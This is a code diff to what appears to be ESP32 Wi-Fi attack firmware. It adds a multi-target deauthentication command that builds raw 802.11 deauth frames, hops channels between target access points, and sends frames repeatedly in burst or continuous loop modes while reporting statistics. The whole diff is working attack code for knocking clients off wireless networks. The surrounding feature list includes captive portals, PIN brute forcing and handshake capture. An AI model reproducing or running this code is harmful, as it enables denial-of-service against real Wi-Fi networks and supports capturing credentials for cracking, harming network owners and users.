@@ -6,6 +6,7 @@
 #include "portal.h"
 #include "beacon.h"
 #include "deauth_detector.h"
+#include "DeauthMultiRules.h"
 #include "hidden_ap.h"
 #include "mesh.h"
 #include "pin_bruteforce.h"
@@ -519,6 +520,287 @@ static void stopDeauthLoopAndWait(uint32_t timeoutMs = 1200) {
     if (!gDeauthLoopActive) gDeauthLoopTaskHandle = nullptr;
 }
 
+// ── DEAUTH_MULTI ──────────────────────────────────────────────────────────────
+struct DeauthMultiTarget {
+    uint8_t bssid[6] = {};
+    uint8_t channel = 0;
+    uint32_t requested = 0;
+    uint32_t sent = 0;
+    uint32_t failed = 0;
+};
+
+static DeauthMultiTarget gDeauthMultiTargets[deauth_multi::kMaxTargets] = {};
+static size_t gDeauthMultiTargetCount = 0;
+static uint8_t gDeauthMultiClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint32_t gDeauthMultiCountPerTarget = 1;
+static uint32_t gDeauthMultiDurationSec = 0;
+static uint16_t gDeauthMultiIntervalMs = deauth_multi::kDefaultIntervalMs;
+static uint8_t gDeauthMultiReason = 7;
+static volatile bool gDeauthMultiActive = false;
+static volatile bool gDeauthMultiStopRequested = false;
+static TaskHandle_t gDeauthMultiTaskHandle = nullptr;
+static uint32_t gDeauthMultiStartedMs = 0;
+static uint32_t gDeauthMultiSent = 0;
+static uint32_t gDeauthMultiFailed = 0;
+static uint8_t gDeauthMultiCurrentChannel = 0;
+static char gDeauthMultiCurrentBssid[18] = {0};
+
+static void formatDeauthMultiMac(const uint8_t mac[6], char out[18]) {
+    snprintf(
+        out,
+        18,
+        "%02X:%02X:%02X:%02X:%02X:%02X",
+        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
+    );
+}
+
+static bool prepareDeauthMultiChannel(uint8_t channel, String& error) {
+    if (!isValidWifiChannel(channel)) {
+        error = "invalid channel";
+        return false;
+    }
+    if (!validateRegulatoryChannel(channel, error)) {
+        return false;
+    }
+
+    const char* band = channel <= 14 ? "2g" : "5g";
+    WifiBandMode bandMode = WifiBandMode::BAND_2G;
+    String bandError;
+    if (!configureWifiBand(band, bandMode, bandError)) {
+        error = bandError;
+        return false;
+    }
+
+    esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (setupErr != ESP_OK) {
+        error = "channel set failed: ";
+        error += esp_err_to_name(setupErr);
+        return false;
+    }
+
+    wifi_config_t apCfg = {};
+    setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
+    if (setupErr == ESP_OK) {
+        apCfg.ap.channel = channel;
+        setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
+    }
+    if (setupErr == ESP_OK) {
+        setupErr = esp_wifi_start();
+    }
+    if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
+        error = "WiFi setup failed: ";
+        error += esp_err_to_name(setupErr);
+        return false;
+    }
+    delay(20);
+    return true;
+}
+
+static bool sendDeauthMultiFrame(
+    const DeauthMultiTarget& target,
+    uint16_t sequence,
+    uint8_t reason
+) {
+    uint8_t frame[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x07
+    };
+    memcpy(frame + 4, gDeauthMultiClient, 6);
+    memcpy(frame + 10, target.bssid, 6);
+    memcpy(frame + 16, target.bssid, 6);
+    frame[22] = sequence & 0xFF;
+    frame[23] = (sequence >> 8) & 0xFF;
+    frame[25] = reason;
+    return esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK;
+}
+
+static uint32_t deauthMultiRequestedTotal() {
+    uint32_t total = 0;
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        total += gDeauthMultiTargets[i].requested;
+    }
+    return total;
+}
+
+static void appendDeauthMultiTargets(JsonDocument& doc) {
+    JsonArray targets = doc["targets"].to<JsonArray>();
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        const DeauthMultiTarget& target = gDeauthMultiTargets[i];
+        char bssid[18];
+        formatDeauthMultiMac(target.bssid, bssid);
+        JsonObject entry = targets.add<JsonObject>();
+        entry["bssid"] = bssid;
+        entry["channel"] = target.channel;
+        entry["requested_frames"] = target.requested;
+        entry["sent_frames"] = target.sent;
+        entry["failed_frames"] = target.failed;
+    }
+}
+
+static void sendDeauthMultiStatsEvent(const char* status, bool stopped) {
+    JsonDocument ev;
+    ev["status"] = status;
+    ev["mode"] = "multi";
+    ev["target_count"] = gDeauthMultiTargetCount;
+    ev["requested_frames"] = deauthMultiRequestedTotal();
+    ev["sent_frames"] = gDeauthMultiSent;
+    ev["failed_frames"] = gDeauthMultiFailed;
+    ev["duration_s"] = gDeauthMultiDurationSec;
+    ev["interval_ms"] = gDeauthMultiIntervalMs;
+    ev["channel"] = gDeauthMultiCurrentChannel;
+    if (gDeauthMultiCurrentBssid[0] != '\0') {
+        ev["target_bssid"] = gDeauthMultiCurrentBssid;
+    }
+    const uint32_t elapsedMs =
+        gDeauthMultiStartedMs == 0 ? 0 : (millis() - gDeauthMultiStartedMs);
+    ev["elapsed_ms"] = elapsedMs;
+    ev["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
+    ev["stopped"] = stopped;
+    appendDeauthMultiTargets(ev);
+    proto.sendEvent("deauth_stats", ev);
+}
+
+static void deauthMultiTaskFn(void*) {
+    const uint32_t durationMs = gDeauthMultiDurationSec * 1000UL;
+    uint16_t sequence = 0x0010;
+    uint32_t lastStatsMs = millis();
+
+    while (!gDeauthMultiStopRequested) {
+        const uint32_t cycleElapsedMs = millis() - gDeauthMultiStartedMs;
+        if (durationMs > 0 && cycleElapsedMs >= durationMs) break;
+
+        for (size_t targetIndex = 0;
+             targetIndex < gDeauthMultiTargetCount && !gDeauthMultiStopRequested;
+             ++targetIndex) {
+            DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
+            gDeauthMultiCurrentChannel = target.channel;
+            formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);
+
+            String channelError;
+            if (!prepareDeauthMultiChannel(target.channel, channelError)) {
+                const uint32_t attempted = gDeauthMultiCountPerTarget;
+                target.requested += attempted;
+                target.failed += attempted;
+                gDeauthMultiFailed += attempted;
+                Serial.printf(
+                    "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
+                    gDeauthMultiCurrentBssid,
+                    target.channel,
+                    channelError.c_str()
+                );
+                continue;
+            }
+
+            for (uint32_t frameIndex = 0;
+                 frameIndex < gDeauthMultiCountPerTarget && !gDeauthMultiStopRequested;
+                 ++frameIndex) {
+                const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
+                if (durationMs > 0 && elapsedMs >= durationMs) break;
+
+                target.requested++;
+                if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
+                    target.sent++;
+                    gDeauthMultiSent++;
+                } else {
+                    target.failed++;
+                    gDeauthMultiFailed++;
+                }
+                sequence += 0x0010;
+
+                if (millis() - lastStatsMs >= 2000) {
+                    lastStatsMs = millis();
+                    sendDeauthMultiStatsEvent("running", false);
+                }
+
+                if (frameIndex + 1 < gDeauthMultiCountPerTarget) {
+                    uint32_t sleepMs = gDeauthMultiIntervalMs;
+                    if (durationMs > 0) {
+                        const uint32_t nowElapsedMs = millis() - gDeauthMultiStartedMs;
+                        const uint32_t remainingMs = durationMs > nowElapsedMs
+                            ? durationMs - nowElapsedMs
+                            : 0;
+                        if (remainingMs < sleepMs) sleepMs = remainingMs;
+                    }
+                    if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
+                    else vTaskDelay(pdMS_TO_TICKS(1));
+                }
+            }
+        }
+
+        if (gDeauthMultiStopRequested) break;
+        if (durationMs > 0 && millis() - gDeauthMultiStartedMs >= durationMs) break;
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+
+    gDeauthMultiActive = false;
+    sendDeauthMultiStatsEvent("finished", gDeauthMultiStopRequested);
+    gDeauthMultiTaskHandle = nullptr;
+    vTaskDelete(nullptr);
+}
+
+static void stopDeauthMultiLoopAndWait(uint32_t timeoutMs = 1500) {
+    if (!gDeauthMultiActive && gDeauthMultiTaskHandle == nullptr) return;
+    gDeauthMultiStopRequested = true;
+    const uint32_t started = millis();
+    while (gDeauthMultiActive && millis() - started < timeoutMs) {
+        delay(10);
+    }
+    if (!gDeauthMultiActive) gDeauthMultiTaskHandle = nullptr;
+}
+
+static void runDeauthMultiBurst() {
+    gDeauthMultiStartedMs = millis();
+    gDeauthMultiSent = 0;
+    gDeauthMultiFailed = 0;
+    gDeauthMultiCurrentChannel = 0;
+    gDeauthMultiCurrentBssid[0] = '\0';
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        gDeauthMultiTargets[i].requested = 0;
+        gDeauthMultiTargets[i].sent = 0;
+        gDeauthMultiTargets[i].failed = 0;
+    }
+
+    uint16_t sequence = 0x0010;
+    for (size_t targetIndex = 0; targetIndex < gDeauthMultiTargetCount; ++targetIndex) {
+        DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
+        gDeauthMultiCurrentChannel = target.channel;
+        formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);
+
+        String channelError;
+        if (!prepareDeauthMultiChannel(target.channel, channelError)) {
+            target.requested += gDeauthMultiCountPerTarget;
+            target.failed += gDeauthMultiCountPerTarget;
+            gDeauthMultiFailed += gDeauthMultiCountPerTarget;
+            Serial.printf(
+                "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
+                gDeauthMultiCurrentBssid,
+                target.channel,
+                channelError.c_str()
+            );
+            continue;
+        }
+
+        for (uint32_t frameIndex = 0; frameIndex < gDeauthMultiCountPerTarget; ++frameIndex) {
+            target.requested++;
+            if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
+                target.sent++;
+                gDeauthMultiSent++;
+            } else {
+                target.failed++;
+                gDeauthMultiFailed++;
+            }
+            sequence += 0x0010;
+            if (frameIndex + 1 < gDeauthMultiCountPerTarget && gDeauthMultiIntervalMs > 0) {
+                delay(gDeauthMultiIntervalMs);
+            }
+        }
+    }
+    sendDeauthMultiStatsEvent("finished", false);
+}
+
 static const char* authModeStr(wifi_auth_mode_t mode) {
     switch (mode) {
         case WIFI_AUTH_OPEN:            return "OPEN";
@@ -538,6 +820,7 @@ static const char* authModeStr(wifi_auth_mode_t mode) {
 // Call this at the top of any CMD that touches Wi-Fi TX/RX.
 static void stopRadioModules() {
     stopDeauthLoopAndWait();
+    stopDeauthMultiLoopAndWait();
     mesh.stop();
     sniffer.stop();
     deauthDetector.stop();
@@ -1087,6 +1370,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         features.add("nrugochi");
         features.add("client_detect");
         features.add("deauth");
+        features.add("deauth_multi");
         features.add("deauth_detect");
         features.add("beacon");
         features.add("portal");
@@ -1604,6 +1888,161 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         }
     }
 
+    // ── DEAUTH_MULTI ─────────────────────────────────────────────────────
+    // Firmware-native multi-target deauth with per-target channel scheduling.
+    else if (strcmp(cmd, "DEAUTH_MULTI") == 0) {
+        JsonVariant args = doc["args"];
+        JsonArray targets = args["targets"].as<JsonArray>();
+        if (targets.isNull() || targets.size() == 0) {
+            proto.sendResp(id, false, "targets required");
+            return;
+        }
+        if (targets.size() > deauth_multi::kMaxTargets) {
+            proto.sendResp(id, false, "too many targets");
+            return;
+        }
+
+        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
+        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        if (!parseMac(clientStr, client)) {
+            proto.sendResp(id, false, "invalid client");
+            return;
+        }
+
+        gDeauthMultiTargetCount = 0;
+        for (JsonVariant targetVar : targets) {
+            const char* bssidStr = targetVar["bssid"] | "";
+            uint8_t channel = targetVar["channel"].as<uint8_t>();
+            uint8_t bssid[6] = {0};
+            if (!parseMac(bssidStr, bssid)) {
+                proto.sendResp(id, false, "invalid target bssid");
+                return;
+            }
+            if (!isValidWifiChannel(channel)) {
+                proto.sendResp(id, false, "invalid target channel");
+                return;
+            }
+            String regulatoryError;
+            if (!validateRegulatoryChannel(channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+            bool duplicate = false;
+            for (size_t existing = 0; existing < gDeauthMultiTargetCount; ++existing) {
+                if (memcmp(gDeauthMultiTargets[existing].bssid, bssid, 6) == 0) {
+                    duplicate = true;
+                    break;
+                }
+            }
+            if (duplicate) {
+                proto.sendResp(id, false, "duplicate target bssid");
+                return;
+            }
+            DeauthMultiTarget& target = gDeauthMultiTargets[gDeauthMultiTargetCount++];
+            target = DeauthMultiTarget{};
+            memcpy(target.bssid, bssid, 6);
+            target.channel = channel;
+        }
+
+        const char* modeStr = args["mode"] | "burst";
+        const bool loopMode = strcmp(modeStr, "loop") == 0;
+        if (!loopMode && strcmp(modeStr, "burst") != 0) {
+            proto.sendResp(id, false, "invalid mode");
+            return;
+        }
+
+        uint32_t count = args["count"].as<uint32_t>();
+        if (count == 0) count = 20;
+        count = deauth_multi::clampFrameCount(count);
+        uint32_t durationSec = args["duration"].as<uint32_t>();
+        durationSec = deauth_multi::clampDurationSec(durationSec);
+        uint16_t intervalMs = deauth_multi::kDefaultIntervalMs;
+        if (args["interval_ms"].is<uint16_t>()) {
+            intervalMs = args["interval_ms"].as<uint16_t>();
+        } else if (args["deauth_interval_ms"].is<uint16_t>()) {
+            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
+        }
+        intervalMs = deauth_multi::clampIntervalMs(intervalMs);
+        uint8_t reason = args["reason"].is<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
+
+        radioIdle();
+
+        memcpy(gDeauthMultiClient, client, 6);
+        gDeauthMultiCountPerTarget = count;
+        gDeauthMultiDurationSec = durationSec;
+        gDeauthMultiIntervalMs = intervalMs;
+        gDeauthMultiReason = reason;
+
+        if (loopMode) {
+            gDeauthMultiSent = 0;
+            gDeauthMultiFailed = 0;
+            gDeauthMultiStartedMs = millis();
+            gDeauthMultiCurrentChannel = 0;
+            gDeauthMultiCurrentBssid[0] = '\0';
+            gDeauthMultiStopRequested = false;
+            gDeauthMultiActive = true;
+            for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+                gDeauthMultiTargets[i].requested = 0;
+                gDeauthMultiTargets[i].sent = 0;
+                gDeauthMultiTargets[i].failed = 0;
+            }
+
+            BaseType_t created = xTaskCreate(
+                deauthMultiTaskFn,
+                "deauthMulti",
+                4096,
+                nullptr,
+                1,
+                &gDeauthMultiTaskHandle
+            );
+            if (created != pdPASS) {
+                gDeauthMultiActive = false;
+                gDeauthMultiTaskHandle = nullptr;
+                proto.sendResp(id, false, "failed to start deauth multi task");
+                return;
+            }
+
+            JsonDocument resp;
+            resp["ok"] = true;
+            resp["mode"] = "multi";
+            resp["active"] = true;
+            resp["target_count"] = gDeauthMultiTargetCount;
+            resp["count"] = gDeauthMultiCountPerTarget;
+            resp["duration"] = gDeauthMultiDurationSec;
+            resp["interval_ms"] = gDeauthMultiIntervalMs;
+            resp["requested_frames"] = 0;
+            resp["sent_frames"] = 0;
+            resp["failed_frames"] = 0;
+            resp["elapsed_ms"] = 0;
+            resp["pps"] = 0.0f;
+            appendDeauthMultiTargets(resp);
+            String json;
+            serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+
+        runDeauthMultiBurst();
+        const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["mode"] = "multi";
+        resp["active"] = false;
+        resp["target_count"] = gDeauthMultiTargetCount;
+        resp["count"] = gDeauthMultiCountPerTarget;
+        resp["duration"] = gDeauthMultiDurationSec;
+        resp["interval_ms"] = gDeauthMultiIntervalMs;
+        resp["requested_frames"] = deauthMultiRequestedTotal();
+        resp["sent_frames"] = gDeauthMultiSent;
+        resp["failed_frames"] = gDeauthMultiFailed;
+        resp["elapsed_ms"] = elapsedMs;
+        resp["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
+        appendDeauthMultiTargets(resp);
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
     // ── DEAUTH_BURST (capture-preserving) ────────────────────────────────
     // Sends a finite deauth burst without stopping an active sniffer. Android
     // uses this to retry deauth while waiting for a handshake capture.
@@ -1693,17 +2132,27 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
 
     // ── DEAUTH_STOP ──────────────────────────────────────────────────────
     else if (strcmp(cmd, "DEAUTH_STOP") == 0) {
-        const uint32_t sent = gDeauthLoopSent;
-        const uint32_t failed = gDeauthLoopFailed;
-        const uint32_t elapsedMs = gDeauthLoopStartedMs == 0
-            ? 0 : (millis() - gDeauthLoopStartedMs);
+        const bool multiWasActive =
+            gDeauthMultiActive || gDeauthMultiTaskHandle != nullptr;
+        const uint32_t sent = multiWasActive ? gDeauthMultiSent : gDeauthLoopSent;
+        const uint32_t failed = multiWasActive ? gDeauthMultiFailed : gDeauthLoopFailed;
+        const uint32_t startedMs = multiWasActive
+            ? gDeauthMultiStartedMs
+            : gDeauthLoopStartedMs;
+        const uint32_t elapsedMs = startedMs == 0 ? 0 : (millis() - startedMs);
         stopDeauthLoopAndWait();
+        stopDeauthMultiLoopAndWait();
         JsonDocument resp;
         resp["ok"] = true;
+        resp["mode"] = multiWasActive ? "multi" : "loop";
         resp["sent_frames"] = sent;
         resp["failed_frames"] = failed;
         resp["elapsed_ms"] = elapsedMs;
         resp["pps"] = framesPerSecond(sent, elapsedMs);
+        if (multiWasActive) {
+            resp["target_count"] = gDeauthMultiTargetCount;
+            appendDeauthMultiTargets(resp);
+        }
         String json;
         serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
